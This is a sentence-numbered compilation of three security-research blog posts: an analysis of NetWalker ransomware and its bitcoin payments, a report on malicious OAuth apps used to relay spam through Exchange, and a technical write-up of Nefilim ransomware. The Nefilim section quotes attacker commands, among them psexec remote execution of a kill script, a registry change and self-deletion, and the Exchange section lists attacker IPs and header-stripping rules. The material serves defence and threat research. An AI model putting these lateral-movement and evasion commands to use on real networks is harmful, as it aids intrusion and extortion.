sentence.1077: Decryptor execution At the end of the decryption process, the program indicates the number of decrypted files, deletes the ransom note if the user has checked that option, and terminates, leaving the user to resume their work peacefully: Figure 22.
sentence.1078: Decryptor has finished the decryption process The decryptor program appears unique and is linked to one victim specifically.
sentence.1079: In our example, it only decrypts the files belonging to the victim who made the payment from the user key specified in the ransom note.
sentence.1080: Underground Advertising In March 2020, the moniker Bugatti began actively advertising the NetWalker Ransomware-as-a-Service on two popular underground fora.
sentence.1081: Bugatti seems to have joined the underground scene in February 2020 but claims to have been active with NetWalker ransomware since September 2019.
sentence.1082: We have seen NetWalker activity before March but there has been a noticeable uptick in larger victims since their advertisement.
sentence.1083: For a relatively new ransomware it has been well received and respected among other cybercriminals as compared to, for instance, Nemty ransomware.
sentence.1084: The strength of NetWalker’s reputation is such that our current hypothesis is that the individual behind Bugatti is most likely a well-respected and experienced cybercriminal, even though it is a new moniker.
sentence.1086: Bugatti advertising NetWalker on an underground forum Bugatti provides regular updates on the improvements in the ransomware, such as the popular Invoke-ReflectivePEInjection method, also commonly used by Sodinokibi.
sentence.1087: In addition to the improvements in the ransomware, open slots for new affiliates are advertised.
sentence.1088: Bugatti strongly emphasized that they are primarily looking for experienced affiliates that focus on compromising the complete networks of organizations as opposed to end users.
sentence.1089: NetWalker is clearly following in the footsteps of its illustrious targeted ransomware peers like Sodinokibi, Maze and Ryuk.
sentence.1090: One forum message in particular caught our attention as it included screenshots of several partial bitcoin addresses and USD amounts.
sentence.1091: This was most likely done to showcase the financial success of the ransomware.
sentence.1092: We have seen a similar posting in the past with the influential Sodinokibi affiliate Lalartu, so we decided to follow the money once more. Figure 24.
sentence.1093: Bugatti is looking for advanced affiliates and shows samples of BTC payments With the help of CipherTrace software we were able to find the complete BTC addresses from the screenshot and investigate the ledger further: Screenshot 1 3JHTYZhRmMcq7WCKRzFN98vWvAZk792w9J Screenshot 2 39aovzbz5rGoQdKjDm6JiybkSu1uGdVJ2V Screenshot 3 39NRnZtgACDVhhmc7RwmvH9ZDUKTNwwaeB Screenshot 4 3L4AW5kHnUCZBBjg2j1LBFCUN1RsHPLxCs Following the Money In the transactions mentioned in the underground forum post, the ransom amount payed by the victims is presumably shown.
sentence.1094: Since the bitcoin blockchain is a publicly accessible ledger, we can follow the money and see where the ransomware actors are transferring it to.
sentence.1095: In the case of the four posted transactions above, the full amount payed by the victim was transferred to two addresses (these addresses begin with bc1q98 and 1DgLhG respectively).
sentence.1096: It is safe to say that these two bitcoin addresses are under control of the NetWalker actors.
sentence.1097: We then proceeded on to analyze all incoming transactions to these two addresses and we were able to make the following observations: The first incoming transaction occurs on 1 March 2020.
sentence.1098: On 30 March 2020 the first incoming transaction appears where the amount is split between 4 different bitcoin addresses.
sentence.1099: A split like this is typically seen in Ransomware-as-a-Service, where the ransom payment is split between the RaaS operators and the affiliate who caused the infection.
sentence.1100: In this first transaction, the split is 80%, 10% and two 5% portions.
sentence.1101: This split matches the advertisement on the underground forum (80% – 20%).
sentence.1102: The two 5% portions of the ransom payments that are split, seem to be consistently transferred to the two bitcoin addresses we revealed earlier (bc1q98 and 1DgLhG).
sentence.1103: While the beneficiaries of the 5% cuts remain the same, the beneficiary of the 10% cut seems to change over time.
sentence.1104: Based on the forum post we assume these addresses also belong to the NetWalker actors.
sentence.1105: Payments to the bc1q98 and 1DgLhG addresses that are not being split continue up until the end of May.
sentence.1106: Possibly the initial NetWalker operators added a RaaS operation, while continuing to cause NetWalker infections themselves.
sentence.1107: While analyzing the bitcoin addresses that received 80% or more of the transaction amount, we noticed that there are some addresses that receive payments multiple times.
sentence.1108: A possible explanation could be that the address is configured as payout addresses for a certain campaign or affiliate.
sentence.1109: We identified 30 unique bitcoin addresses that seem to be the beneficiary of this larger portion of the ransom transaction.
sentence.1110: Some of these only received one payment but there are several that received multiple payments.
sentence.1111: In the two addresses uncovered by tracing the transactions a total of 641 bitcoin is held on 27 July 2020.
sentence.1112: Which at the current market value of bitcoin is worth well over 7 million USD.
sentence.1113: Amounts Extorted Working under the hypothesis that all the incoming transactions are ransomware payments; we can make the following observations: We found 23 transactions where the ransom payments were not split up and the beneficiaries are the two bitcoin addresses found by following the transactions mentioned in the underground forum post.
sentence.1114: The total amount of bitcoin extorted this way between 1 March 2020 and 27 July 2020 is 677 BTC.
sentence.1115: Additionally, the amount received from remaining transactions following the Ransomware-as-a-Service scheme by these addresses between 1 March 2020 and 27 July 2020 is 188 BTC.
sentence.1116: In the transactions that are split, the largest amount (usually 80% to 90% of the total transaction value) is presumably transferred to the affiliate that caused the infection.
sentence.1117: When we summed up these largest portions, we saw a total of 1723 BTC being transferred to affiliates.
sentence.1118: The total amount of extorted bitcoin that has been uncovered by tracing transactions to these NetWalker related addresses is 2795 BTC between 1 March 2020 and 27 July 2020.
sentence.1119: By using historic bitcoin to USD exchange rates, we estimate a total of 25 million USD was extorted with these NetWalker related transactions.
sentence.1120: Even though we do not have complete visibility into the BTC flow before NetWalker started ramping up, one thing is certain, this quarter alone it has been highly successful at extorting organisations for large amounts of money.
sentence.1121: All this at a time when many sectors are struggling because people are sheltering in place and governments are trying to keep businesses from going bankrupt.
sentence.1122: NetWalker is making millions off the backs of legitimate companies.
sentence.1124: Overview of uncovered bitcoin transactions, highlighting the two identified actor addresses.
sentence.1125: Observed Changes While talking about the impact of NetWalker with our partners, we learned that the change in modus operandi not only affected the way the actors communicate with their victims.
sentence.1126: When there was a change from email communication to a dedicated Tor hidden service, the actors also moved away from using legacy bitcoin addresses to SegWit addresses.
sentence.1127: The benefits of using the newer SegWit addresses include faster transaction time and lower transaction cost.
sentence.1128: The NetWalker advertisement on the underground forum mentions instant and fully automatic payments around the time of this observed change.
sentence.1129: This makes us believe the ransomware actors were professionalizing their operation just before expanding to the Ransomware-as-a-Service model.
sentence.1130: Comparison with Previous Ransomware Given the sudden appearance of NetWalker ransomware and the associated threat actor, it suggests that some prior knowledge on ransomware development or underground presence had to be in place.
sentence.1131: Armed with this hypothesis, we searched for possible links to underground actors and other ransomware strains that might fit the bill.
sentence.1132: We came across one threat actor offering ransomware that caught our attention.
sentence.1133: It was the use of the name NetWalker, in combination with a strong ransomware connection, that sparked our interest.
sentence.1134: Some years ago, a threat actor using the moniker Eriknetwalker was advertising ransomware on several underground forums.
sentence.1135: We found posts from 2016 and the latest public activity was around June 2019, several months before NetWalker ransomware made its appearance.
sentence.1137: Eriknetwalker began advertising their ransomware in 2016 (Google-translated from Russian)
sentence.1138: Based on our underground research, we linked the moniker Eriknetwalker to the development and/or distribution of Amnesia, Bomber and Scarab ransomware.
sentence.1139: Eriknetwalker stopped advertising ransomware around June 2019.
sentence.1140: Therefore, we decided to perform a comparative analysis between the different ransomware strains linked to Eriknetwalker and some of the earliest versions of NetWalker we could find.
sentence.1141: The goal of this comparative analysis was to identify whether there was an overlap between source codes.
sentence.1142: Such overlap could suggest a stronger link between the current NetWalker version and the other ransomware versions from Eriknetwalker, possibly even explaining the name overlap.
sentence.1143: To execute the analysis, we used several tools one of which was the binary visualization tool Veles, which dynamically translates binary information into an abstract visualization that allows us to identify and compare patterns.
sentence.1144: The different types of ransomware we began analyzing were the variants of Amnesia, Scarab, and NetWalker.
sentence.1146: Flat visualization of binary data of the different ransomware variants Figure 28.
sentence.1147: 3D visualization of binary data of the different ransomware variants Visualizing data in such a manner is a way to use the human brain to quickly identify patterns and be able to draw comparisons between objects.
sentence.1148: In our case, we see that, based on the binary data visualized in Figures 27 and 28, the ransomware binaries do yield differences that we cannot ignore.
sentence.1150: Comparison of source code results Figure 29 shows the results of a source code similarity analysis led on the different variants of ransomware named in the figure itself.
sentence.1151: Interesting enough, Scarab and Amnesia show a higher overlap with Buran and Zeppelin than the early NetWalker samples.
sentence.1152: The percentages shown are the amount of code that is similar between two variants.
sentence.1153: As illustrated in the overview, the September 2019 NetWalker version has a different codebase from the ErikNetWalker-linked ransomware variants.
sentence.1154: This finding disproves our earlier hypothesis that NetWalker is linked to the older Amnesia variants based on code overlap.
sentence.1155: Often, research teams do not publish their results when it disproves their own hypothesis.
sentence.1156: However, for the sake of transparency, we decided to include our research efforts.
sentence.1157: YARA Rules We uploaded a YARA rule to detect almost all the samples observed in the wild to date.
sentence.1158: Indicators of Compromise During our investigation we have observed numerous IoCs linked to NetWalker ransomware.
sentence.1159: To obtain them please visit our McAfee ATR GitHub site, or get the latest NetWalker IoCs and intelligence on many other threats with McAfee Insights.
sentence.1161: The below techniques were based on our research and complemented with research from industry peers.
sentence.1162: Initial Access Exploit Public-Facing Application (T1190) : Exploit Tomcat, Exploit WebLogic Spear phishing Attachment (T1566.001):
sentence.1163: Phishing email Valid Accounts (T1078): RDP compromised Execution PowerShell (T1059.001):
sentence.1164: PowerShell Script Command and Scripting Interpreter:
sentence.1166: PsExec Native API (T1106): Use Windows API functions to inject DLL Windows Management Instrumentation (T1047) Persistence Registry Run Key (T1547.001):
sentence.1167: Place a value on RunOnce key Modify Registry key (T1112): Create its own registry key in \SOFTWARE\<uniquename> Privilege Escalation Exploitation for Privilege Escalation (T1068): CVE-2020-0796, CVE-2019-1458, CVE-2017-0213, CVE-2015-1701 Process Injection (T1055.001): Reflective DLL Injection Defense Evasion Disabling Security Tools (T1562.001): ESET AV Remover, Trend Micro’s Security Agent Uninstall Tool, Microsoft Security Client Uninstall Process Injection (T1055.001): Reflective DLL Injection Deobfuscate/Decode Files or Information (T1140) Obfuscated Files or Information (T1027): PowerShell Script uses Base64 and hexadecimal encoding and XOR-encryption Credential Access Credential Dumping (T1003): Mimikatz, Mimidogz, Mimikittenz, Windows Credentials Editor, Pwdump, LaZagne Brute Force (T1110.001): NLBrute Discovery Network Service Scanning (T1046): SoftPerfect Network Scanner Security Software Discovery (T1518.001)
sentence.1168: System Information Discovery (T1082) Lateral Movement Third-Party Software (T1072): TeamViewer, Anydesk Service Execution (T 1569.002): PsExec Lateral Tool Transfer (T1570) Collection Data from information repositories (T1213) Data from local system (T1005) Data from network shared drive (T1039) Command and Control Ingress Tool Transfer (T1105)
sentence.1169: Impact Data Encrypted (T1486): NetWalker Ransomware Inhibit System Recovery (T1490): Shadow Copies Deleted Service Stop (T1489) Conclusion Ransomware has evolved into a lucrative business for threat actors, from underground forums selling ransomware, to offering services such as support portals to guide victims through acquiring crypto currency for payment, to the negotiation of the ransom.
sentence.1170: McAfee’s Advanced Threat Research team has analysed the NetWalker ransomware and have been following its evolution from the initial sighting of the Mailto ransomware to its redevelopment into the NetWalker ransomware.
sentence.1171: The recent shift to a business-centric model of Ransomware-as-a-Service is a clear sign that it is stepping up, so it seems that the NetWalker group is following in the footsteps of REvil and other successful RaaS groups.
sentence.1172: The ransomware developers have proven the ability to refocus and capitalize on current world events and develop lures to help ensure the effectiveness of the ransomware, which has allowed them to become selective of their affiliates by limiting access to the ransomware to only those with vetted access to large organizations.
sentence.1173: As development of the ransomware continues, we have witnessed recent shifts in activity that closely follow in the footsteps of other ransomware developments, including threatening victims with the release of confidential information if the ransom is not met.
sentence.1174: McAfee ATR is actively monitoring ransomware threats and will continue to update McAfee MVISION Insights and its social networking channels with new and current information.
sentence.1175: MVISION Insights is the only proactive endpoint security solution that simultaneously prioritizes and predicts threats that matter to our customers while offering prescriptive guidance on what to do in their local environment.
sentence.1176: Want to stay ahead of the adversaries?
sentence.1177: Check out McAfee MVISION Insights for more information.
sentence.1178: If you want to experience some of the MVISION Insights capabilities, go the Preview of MVISION Insights where you can select the top threat information that is available.
sentence.1179: Authored by: Thibault Seret, Valentine Mairet, Jeffrey Sman, Alfred Alvarado, Tim Hux, Alexandre Mundo, John Fokker, Marc Rivero Lopez and Thomas Roccia.
sentence.1180: The post Take a “NetWalk” on the Wild Side appeared first on McAfee Blog.
sentence.1181: title: Malicious OAuth applications used to compromise email servers and spread spam - Microsoft Security Blog url: http://www.microsoft.com/security/blog/2022/09/22/malicious-oauth-applications-used-to-compromise-email-servers-and-spread-spam/ Microsoft researchers recently investigated an attack where malicious OAuth applications were deployed on compromised cloud tenants and then used to control Exchange servers and spread spam.
sentence.1182: The investigation revealed that the threat actor launched credential stuffing attacks against high-risk accounts that didn’t have multi-factor authentication (MFA) enabled and leveraged the unsecured administrator accounts to gain initial access.
sentence.1183: The unauthorized access to the cloud tenant enabled the actor to create a malicious OAuth application that added a malicious inbound connector in the email server.
sentence.1184: The actor then used the malicious inbound connector to send spam emails that looked like they originated from the targets’ domain.
sentence.1185: The spam emails were sent as part of a deceptive sweepstakes scheme meant to trick recipients into signing up for recurring paid subscriptions.
sentence.1186: Microsoft has been monitoring the rising popularity of OAuth application abuse.
sentence.1187: One of the first observed malicious usage of OAuth applications in the wild is consent phishing.
sentence.1188: Consent phishing attacks aim to trick users into granting permissions to malicious OAuth apps to gain access to user’s legitimate cloud services (mail servers, files storage, management APIs, etc.).
sentence.1189: In the past few years, Microsoft has observed that more and more threat actors, including nation-state actors, have been using OAuth applications for different malicious purposes – command-and-control (C2) communication, backdoors, phishing, redirections, and so on.
sentence.1190: This recent attack involved a network of single-tenant applications installed in compromised organizations being used as the actor’s identity platform to perform the attack.
sentence.1191: As soon as the network was revealed, all the related applications were taken down and notifications to customers were sent, including recommended remediation steps.
sentence.1192: This blog presents the technical analysis of this attack vector and the succeeding spam campaign attempted by the threat actor.
sentence.1193: It also provides guidance for defenders on protecting organizations from this threat, and how Microsoft security technologies detect it. Figure 1.
sentence.1195: The time between application deployment and usage varied; there were cases where the actor took months before using the application.
sentence.1196: Initial access For the attack to succeed, the threat actor needed to compromise cloud tenant users with sufficient permissions that would allow the actor to create an application in the cloud environment and give it admin consent.
sentence.1197: The actor performed credential stuffing attacks against their targets, attempting to access users with the global admin role.
sentence.1198: The authentication attempts, which originated from a single IP address, were launched against the Azure Active Directory PowerShell application (app ID: 1b730954-1685-4b74-9bfd-dac224a7b894).
sentence.1199: The same application was later used to deploy the rest of the attack.
sentence.1200: Based on the success ratio of the authentication attempts, it is inferred that the attacker used a dump of compromised credentials.
sentence.1201: The investigation also revealed that 86% of the compromised tenants had at least one admin with a real-time high risk score, which means they were flagged by Azure AD Identity Protection to be most likely compromised.
sentence.1202: It is also important to note that all the compromised admins didn’t have MFA enabled, which could have stopped the attack.
sentence.1203: These observations amplify the importance of securing accounts and monitoring for high-risk users, especially those with high privileges.
sentence.1204: Deploying malicious OAuth application Once the threat actor gained access to privileged users, their next step was to set up the malicious application.
sentence.1205: Based on analysis of the event user agent (Swagger-Codegen/1.4.0.0/csharp) and how quickly the deployment of the application was done, it is likely that the actor ran a PowerShell script to perform the following Azure Active Directory (AAD) management activities in all targeted tenants: Register a new single–tenant application with the naming convention of [domain name]_([a-zA-Z]){3} (for example: Contoso_GhY)Add the legacy permission Exchange.ManageAsApp which can be used for app-only authentication of Exchange Online PowerShell moduleGrant admin consent to the above permissionGive global admin and Exchange admin roles to the previously registered applicationAdd application credentials (key/certificate/both) The threat actor added their own credentials to the OAuth application, which enabled them to access the application even if the initially compromised global administrator changed their password.
sentence.1206: The activities mentioned gave the threat actor control of a highly privileged application.
sentence.1207: It was observed that the threat actor did not always use the application right after it was deployed.
sentence.1208: In some cases, it took weeks or months before the application was utilized.
sentence.1209: Also, in organizations that didn’t monitor for suspicious applications, the applications were deployed for months and used multiple times by the threat actor.
sentence.1210: Modifying Exchange settings The threat actor used the privileged application to authenticate the Exchange Online PowerShell module and modify the Exchange settings of the compromised server.
sentence.1211: There were two modifications which allowed them to perform the next step in the attack chain: Create a new inbound connector Connectors are a collection of instructions that customize the way email flows to and from organizations using Microsoft 365 or Office 365.
sentence.1212: Most organizations using Microsoft 365 and Office 365 don’t need custom connectors for regular mail flow, but some use it when they need to process messages from another messaging system that’s not running Exchange, or if they have a network appliance that performs policy checks and then routes messages to their Exchange server.
sentence.1213: The threat actor set a new inbound connector with the naming convention Ran_([a-zA-Z]){5} (for example Ran_xAFzd).
sentence.1214: The purpose of the inbound connector was to allow mails from certain IPs (that are related to the attacker’s infrastructure) to flow through the victim’s Exchange server.
sentence.1215: This allowed the threat actor to send emails that looked like they originated from the compromised Exchange domain.
sentence.1216: The configuration information for the newly created connectors were seen in Exchange audit event New-InboundConnector.
sentence.1217: The following table shows the configuration parameters in the audit event related to this change: NameValue“Name”“Ran_jBelh”“Enabled”“True”“CloudServicesMailEnabled”“True”“RestrictDomainsToCertificate”“False”“SenderDomains”“smtp:*;1”“SenderIPAddresses”“170.75.174.97;170.75.172.8;170.75.170.69;170.75.174.95; 54.39.94.145;149.56.200.36;158.69.21.185;66.70.201.131”“RestrictDomainsToIPAddresses”“True”“ConnectorSource”“HybridWizard”“EFSkipIPs”“170.75.174.97;170.75.172.8;170.75.170.69;170.75.174.95; 54.39.94.145;149.56.200.36;158.69.21.185;66.70.201.131”“TreatMessagesAsInternal”“False”“ConnectorType”“OnPremises”“RequireTls”“False”Create transport rules Transport rules (also known as mail flow rules) are sets of actions that can be taken on any mail that flows in the organization.
sentence.1218: The threat actor utilized this feature to set 12 new transport rules with the naming convention of Test01 to Test012.
sentence.1219: Each of these transport rules were responsible for deleting the following specific headers from every mail that flowed in the organization: X-MS-Exchange-ExternalOriginalInternetSenderX-MS-Exchange-SkipListedInternetSenderReceived-SPFReceivedARC-Authentication-ResultsARC-Message-SignatureDKIM-SignatureARC-SealX-MS-Exchange-SenderADCheckX-MS-Exchange-Authentication-ResultsAuthentication-ResultsX-MS-Exchange-AntiSpam-MessageData-ChunkCountBy deleting these headers, the attacker tried defense evasion to prevent security products or email providers detecting or blocking their emails and increase the success rate of the spam campaign.
sentence.1220: The configuration information for the newly created transport rules were seen in Exchange audit event New-TransportRule.
sentence.1221: The following table shows the configuration parameters in the audit event related to this change: NameValue“Name”“Test06”“SenderAddressLocation”“Header”“RemoveHeader”“ARC-Message-Signature”These modifications to the Exchange server settings allowed the threat actor to perform their primary goal in the attack: sending out spam emails.
sentence.1222: After each spam campaign, the actor deleted the malicious inbound connector and transport rules to prevent detection, while the application remained deployed in the tenant until the next wave of the attack (in some cases, the app was dormant for months before it was reused by the threat actor).
sentence.1224: An example of the PowerShell script used for setting new Exchange connector and transport rulesSpam email campaign sent through Exchange connector The actor behind this attack has been actively running spam email campaigns for many years.
sentence.1225: Based on our research, this actor has sent high volumes of spam emails in short timeframes through other methods, such as connecting to mail servers from rogue IP addresses or sending directly from legitimate cloud-based bulk email sending infrastructure.
sentence.1226: The actor’s motive was to propagate deceptive sweepstakes spam emails designed to trick recipients into providing credit card details and signing up for recurring subscriptions under the guise of winning a valuable prize.
sentence.1227: While the scheme possibly led to unwanted charges for targets, there was no evidence of overt security threats such as credential phishing or malware distribution.
sentence.1228: The spam campaign carried the hallmarks of this actor: programmatically generated messages containing two visible hyperlinked images in the email body, as well as dynamic and randomized content injected within the HTML body of each mail message to evade spam filters. Figure 3.
sentence.1229: An example of spam email sent through the Exchange inbound connectorThe hyperlinked images within the spam messages implied to recipients that they were eligible for a prize.
sentence.1230: Once clicked, the hyperlink directed recipients to a website where they were asked to complete a survey and provide credit card details to pay for the shipping of their prize.
sentence.1231: Familiar brand logos, names, and websites were used throughout the spam email, likely to give an illusion of legitimacy.
sentence.1233: Clicking the image in the spam email leads to this website indicating a prize has been wonThe fine print, visible only by scrolling to the very bottom of a subsequent page, revealed that in providing their credit card information, recipients were not paying a shipping fee for their prize, but were in fact agreeing to be charged fees for several paid subscription services in order to enter into a sweepstakes for the prize.
sentence.1234: It is likely the threat actor’s main motive was potential financial gain from people who fell victim to this deceptive sweepstakes spam campaign.
sentence.1236: The fine print shows the chance to win a prize is only through a sweepstakes after paying feesLikely to achieve scale and further maximize the chances of successful email delivery, the actor triggered this spam campaign from cloud-based outbound email infrastructure outside of Microsoft, mainly Amazon SES and Mail Chimp.
sentence.1237: These email platforms enable sending of mass bulk email, normally for marketing and other legitimate purposes.
sentence.1238: The campaign also utilized techniques to generate unique dynamic URLs underpinning the hyperlinked images within each spam email message, as shown in the examples below.
sentence.1240: Examples of dynamic URL generation (domain obfuscated)This spam campaign exclusively targeted consumer email accounts.
sentence.1241: In the case of spam messages sent to Microsoft-hosted consumer email accounts (outlook.com), the spam emails were moved into customers’ junk folders before they could be viewed and clicked.
sentence.1242: Mitigations While the follow-on spam campaign targets consumer email accounts, this attack targets enterprise tenants to use as infrastructure for this campaign.
sentence.1243: This attack thus exposes security weaknesses that could be used by other threat actors in attacks that could directly impact affected enterprises.
sentence.1244: As the main initial access vector of the attack was to obtain the admin’s credentials, we recommend organizations take the following steps to reduce their attack surface: Mitigate credential guessing attacks risks A key step in reducing the attack surface is securing the identity infrastructure.
sentence.1245: The most common initial access vector observed in this attack was account compromise through credential stuffing, and all the compromised administrator accounts did not have MFA enabled.
sentence.1246: Implementing security practices that strengthen account credentials such as enabling MFA raises the cost of an attack.
sentence.1247: Enable conditional access policies Conditional access policies are evaluated and enforced every time the user attempts to sign in.
sentence.1248: Organizations can protect themselves from attacks that leverage stolen credentials by enabling policies such as device compliance or trusted IP address requirements.
sentence.1249: Enable continuous access evaluation Continuous access evaluation (CAE) revokes access in real time when changes in user conditions trigger risks, such as when a user is terminated or moves to an untrusted location.
sentence.1250: Enable security defaults While some of the features mentioned above require paid subscriptions, the security defaults in Azure AD, which is mainly for organizations using the free tier of Azure Active Directory licensing, are sufficient to better protect the organizational identity platform, as they provide preconfigured security settings such as MFA, protection for privileged activities, and others.
sentence.1251: Detections for related techniques Leveraging its cross-signal capabilities, Microsoft 365 Defender alerts customers using Microsoft Defender for Office 365, Microsoft Defender for Cloud Apps, Application governance add-on, and Azure Active Directory Identity Protection to detect the techniques covered in the attack through the attack chain.
sentence.1252: Each product can provide a different aspect for protection to cover the techniques observed in this attack: Microsoft 365 Defender Suspicious email-sending pattern from new Exchange inbound connector – This alert is generated when a suspicious email-sending pattern originating from a new Exchange inbound connector is detected.
sentence.1253: This behavior might suggest that an attacker set a malicious inbound connector to allow anonymous relay through the organization’s Exchange server.
sentence.1254: Recommended reading to response for malicious connector incidents: New transport rule removing antispam header –
sentence.1255: This alert is generated when a new transport rule to remove antispam header is detected.
sentence.1256: Suspicious inbound connector and transport rule created to remove sender email headers – This alert is generated when a suspicious inbound connector and transport rule is created to remove headers that identify the true source address of sender.
sentence.1257: This might indicate a spam campaign is ongoing from the organization’s mailbox.
sentence.1258: Suspicious Azure AD app creation – This alert is generated when a user account creates Azure Active Directory OAuth application with suspicious characteristics, as observed in this campaign.
sentence.1259: Azure AD app registration by risky user – This alert is generated when a user account with high risk score as calculated by AAD Identity Protection is creating a new OAuth application and grants admin consent to it.
sentence.1260: Microsoft Defender for Office 365 Microsoft Defender for Office 365 detects threat activity associated with this spamming campaign through the following email security alerts.
sentence.1261: Note, however, that these alerts may also be triggered by unrelated threat activity.
sentence.1262: We’re listing them here because we recommend that these alerts be investigated and remediated immediately.
sentence.1263: Email messages from a campaign removed after delivery​. This alert is generated when any messages associated with a campaign are delivered to mailboxes in an organization.
sentence.1264: Microsoft removes the infected messages from Exchange Online mailboxes using zero-hour auto purge (ZAP) if this event occurs.
sentence.1265: Microsoft Defender for Cloud Apps Activity from suspicious IP addresses.
sentence.1266: This alert is generated when there is activity from an IP address that has been identified as risky by Microsoft Threat Intelligence or by the organization.
sentence.1267: These IP addresses were identified as being involved in malicious activities, such as performing password spray, botnet C2, and may indicate a compromised account.
sentence.1268: Activity from a password-spray associated IP address.
sentence.1269: This alert is generated when a successful sign-in from an IP address that had been identified as participating in password spray was observed.
sentence.1270: App governance App governance is an add-on to Microsoft Defender for Cloud Apps, which can detect malicious OAuth applications that make sensitive Exchange Administrative activities along with other threat detection alerts.
sentence.1271: Activity related to this campaign will trigger the following alert: OAuth app with suspicious metadata has Exchange permission​. This alert is generated when a line of business OAuth app with suspicious metadata has privilege to manage permission over Exchange, which can lead an OAuth App to perform data collection or exfiltration activities or attempts to access and retrieve sensitive information.
sentence.1272: Azure AD Identity Protection Azure AD Identity Protection automatically detects and remediates identity-based risks.
sentence.1273: It detects suspicious sign-in attempts and raises any of the following alerts: Anomalous Token.
sentence.1274: This alert flags a token’s unusual characteristics, such as its token lifetime or played from an unfamiliar location.
sentence.1276: In this phishing campaign, the attackers used multiple proxies or VPNs originating from various countries or regions unfamiliar to the target user.
sentence.1277: This alert flags anomalies in the token claims, token age, and other authentication attributes.
sentence.1279: This alert flag sign-in attempts from anonymous IP addresses (for example, Tor browser or anonymous VPN).Hunting queries To locate related activity, Microsoft 365 Defender customers can run the following advanced hunting queries: Applications given the “Exchange.ManageAsApp” permission: CloudAppEvents | where Timestamp > ago(30d) | where ActionType == "Add app role assignment to service principal.
sentence.1282: Role Id | project Timestamp, AccountObjectId,AccountDisplayName, AppId = RawEventData.ModifiedProperties[0].NewValue, AppName = RawEventData.
sentence.1283: ModifiedProperties[6].NewValue New transport rules that remove anti-spam headers from emails: CloudAppEvents | where ActionType == "New-TransportRule" | mvexpand Param = RawEventData.
sentence.1286: Value contains "X-MS-Exchange-AntiSpam-MessageData" | project Timestamp, AccountObjectId, AccountDisplayName, ServicePrincipalId = tostring(RawEventData.
sentence.1288: title: Nefilim Ransomware url: https://blog.qualys.com/vulnerabilities-threat-research/2021/05/12/nefilim-ransomware Over the past year there has been a rise in extortion malware that focuses on stealing sensitive data and threatening to publish the data unless a ransom is paid.
sentence.1289: This technique bypasses some of the mitigations put in place, such as backups, which would allow IT organizations to recover data without having to pay such a ransom.
sentence.1290: One of the more popular ransomware families over the last few months to switch to this extortion tactic was Nefilim.
sentence.1291: About Nefilim Ransomware Nefilim ransomware emerged in March 2020 when Nemty operators quit the ransomware as a service model to concentrate their energy on more targeted attacks with more focused resources.
sentence.1292: The author of the Nemty ransomware also appears to have shared Nemty’s source code with others.
sentence.1293: According to Vitali Kremez and ID Ransomware’s Michael Gillespie, the new Nefilim ransomware appears to be based on Nemty’s code.
sentence.1294: Sharing many notable similarities with Nemty version 2.5, Nefilim has the capabilities to move laterally within networks.
sentence.1295: Nefilim targets vulnerabilities such as CVE-2019-11634 and CVE-2019-19781 in Citrix gateway devices, identified in December 2019 and patched in January 2020.
sentence.1296: The hackers target organizations using the unpatched or poorly secured Citrix remote-access technology, stealing data and then deploying ransomware.
sentence.1297: Nefilim attackers exfiltrate sensitive data before encryption.
sentence.1298: When ransoms are not paid, they have been known to shame victims by posting their data on the dark web. Technical Details Initial access Nefilim ransomware is distributed through exposed Remote Desktop Protocol (RDP) setups by brute-forcing them and using other known vulnerabilities for initial access, i.e. vulnerabilities in Citrix gateway devices.
sentence.1299: Nefilim places a heavy emphasis on Remote Desktop Protocols.
sentence.1300: Once an attacker gains a foothold on the victim system, the attacker drops and executes its components such as anti-antivirus, exfiltration tools, and finally Nefilim itself.
sentence.1301: Lateral Movement Among the various tactics and techniques used by the attackers, they rely on tools such as PsExec to remotely execute commands in their victims’ networks.
sentence.1302: It has been also seen that Nefilim uses other tools to gather credentials that include Mimikatz, LaZagne, and NirSoft’s NetPass.
sentence.1303: It uses bat files to stop services/kill processes as shown in below image, and the stolen credentials are used to reach high-value machines like servers.
sentence.1304: The hackers work to move around the network before deploying their ransomware to find out where juicier data may be stored.
sentence.1305: They exfiltrate sensitive data before encryption.
sentence.1306: Some of the commands that execute by the attacker Start copy kill.bat \destinationip\c$\windows\temp Start psexec.exe \destinationip -u domain\username\ -p password -d
sentence.1307: -h -r mstdc -s -accepteula -nobanner c:\windows\teamp\Kill.bat Start psexec.exe -accepteula \destinationip -u domain\username\ -p password reg add HKLM\software\Microsoft\Windows\CurrentVersion\Policies\System /v
sentence.1311: /password:”password” process CALL CREATE “cmd.exe /c C:\WINDOWS\TEMP\kill.bat" Below images shows A batch file to stop services/kill processes Fig.
sentence.1313: 2 Killing Process Data exfiltration It copies data from servers/shared directories to the local directory and compresses with dropped 7zip binary.
sentence.1314: It also drops and installs MegaSync to exfiltrate data.
sentence.1315: Ransomware Execution The Nefilim malware uses AES-128 encryption to lock files and their blackmail payments are made via email.
sentence.1316: After encryption, it dropped the ransomware note by named ‘NEFILIM-DECRYPT.txt’.
sentence.1317: All files are encrypted with the extension of (.NEFILIM).
sentence.1318: It appends AES encrypted key at end of the encrypted file.
sentence.1319: This AES encryption key will then be encrypted by an RSA-2048 public key that is embedded in the ransomware executable.
sentence.1320: In addition to the encrypted AES key, the ransomware will also add the “NEFILIM” string as a file marker to all encrypted files. Fig.
sentence.1321: 3 Crypto API’s in Nefilim IOC In the Below image malware create Mutex Fig.
sentence.1322: 4 Creating Mutex Some of the Anti-debugging techniques: Ransomware uses anti-debugging method by calling the IsDebuggerPresent function.
sentence.1323: This function detects if the calling process is being debugged by a user-mode debugger.
sentence.1324: It also makes use of API GetTickCount / QueryPerformanceCounter to get the number of ticks since the last system reboot.
sentence.1325: It checks for a timestamp and compare it to another one after a few malicious instructions, in order to check if there was a delay.
sentence.1329: 6 Anti debugging API Shell execute: Nefilim delete itself from the target systems after infection with the help of ShellExecute API "C:\Windows\System32\cmd.exe" /c
sentence.1331: 3 /nobreak && del "C:\Users\admin\Download{ransomware_filename}.exe" /s /f /q Fig. 7 Self Deletion High-Profile Attacks Taking a Toll Nefilim’s highest-profile ransomware attack to date was against the Australian shipping organization, Toll Group.
sentence.1332: The attack was first published on May 5, 2020.
sentence.1333: Two months previously, Toll Group was a victim of a Netwalker ransomware attack.
sentence.1334: In both cases, Toll Group refused to pay the ransom.
sentence.1335: In response, Nefilim leaked sensitive Toll Group data and popularized that Toll Group had failed to employ full cybersecurity protocols even after the Netwalker attack, potentially making the organization vulnerable to more attacks.
sentence.1336: This demonstrates how Nefilim will keep the pressure on its victims to pay ransoms.
sentence.1337: Mitigation or Additional Important Safety Measures Network Keep strong and unique passwords for login accounts.
sentence.1339: If required change RDP port to a non-standard port.
